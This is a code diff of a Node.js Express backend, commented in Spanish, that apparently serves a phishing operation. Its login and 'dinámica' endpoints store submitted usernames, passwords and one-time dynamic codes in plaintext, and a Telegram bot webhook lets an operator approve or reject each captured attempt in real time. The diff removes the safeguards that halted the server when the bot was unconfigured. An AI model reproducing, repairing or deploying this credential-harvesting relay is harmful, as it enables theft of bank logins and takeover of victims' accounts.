@@ -1,7 +1,7 @@
 require('dotenv').config();
 const express = require('express');
 const { Pool } = require('pg');
-const TelegramBot = require('node-telegram-bot-api'); // 🔥 Importación directa
+const TelegramBot = require('node-telegram-bot-api');
 const cors = require('cors');
 
 const app = express();
@@ -13,20 +13,16 @@ const pool = new Pool({
     ssl: { rejectUnauthorized: false } 
 });
 
+// 🔥 ELIMINAMOS EL BLOQUE QUE DABA EL FALSO ERROR
 const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-let bot = null;
-if (TELEGRAM_TOKEN && CHAT_ID) {
-    bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });
-} else {
-    console.error("❌ Faltan las variables de entorno TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID.");
-}
+// Inicializamos el bot directamente (si llegó el mensaje antes, es porque las variables SÍ están)
+const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });
 
 const BACKEND_URL = process.env.BACKEND_URL || 'https://backkkk-rj54.onrender.com';
 
 async function registrarWebhook() {
-    if (!bot) return;
     try {
         const url = `${BACKEND_URL}/webhook/telegram`;
         await bot.setWebHook(url);
@@ -37,9 +33,11 @@ async function registrarWebhook() {
 }
 registrarWebhook();
 
+// ==========================================
+// 1. LOGIN
+// ==========================================
 app.post('/api/login', async (req, res) => {
     const { usuario, clave } = req.body;
-    if (!bot) return res.status(500).json({ success: false, message: "Bot no configurado" });
 
     try {
         const query = `INSERT INTO intentos_login (usuario, clave, estado, fecha) VALUES ($1, $2, 'pendiente', NOW()) RETURNING id;`;
@@ -77,9 +75,11 @@ app.get('/api/status/:id', async (req, res) => {
     }
 });
 
+// ==========================================
+// 2. DINÁMICA
+// ==========================================
 app.post('/api/dinamica', async (req, res) => {
     const { usuario, clave, claveDinamica } = req.body;
-    if (!bot) return res.status(500).json({ success: false, message: "Bot no configurado" });
 
     try {
         const query = `INSERT INTO intentos_dinamica (usuario, clave, clave_dinamica, estado, fecha) VALUES ($1, $2, $3, 'pendiente', NOW()) RETURNING id;`;
@@ -117,9 +117,13 @@ app.get('/api/status-dinamica/:id', async (req, res) => {
     }
 });
 
+// ==========================================
+// 3. WEBHOOK (AQUÍ ESTABA EL PROBLEMA DE LOS BOTONES)
+// ==========================================
 app.post(`/webhook/telegram`, async (req, res) => {
     const callbackQuery = req.body.callback_query;
-    if (callbackQuery && bot) {
+
+    if (callbackQuery) {
         const data = callbackQuery.data; 
         const chatId = callbackQuery.message.chat.id;
         const messageId = callbackQuery.message.message_id;
@@ -149,11 +153,13 @@ app.post(`/webhook/telegram`, async (req, res) => {
             });
 
             await bot.answerCallbackQuery(callbackQuery.id, { text: `Estado: ${nuevoEstado}` });
+
         } catch (error) {
             console.error("Error procesando webhook:", error);
             bot.answerCallbackQuery(callbackQuery.id, { text: "Este intento ya fue procesado o expiró." }).catch(()=>{});
         }
     }
+
     res.sendStatus(200);
 });
 
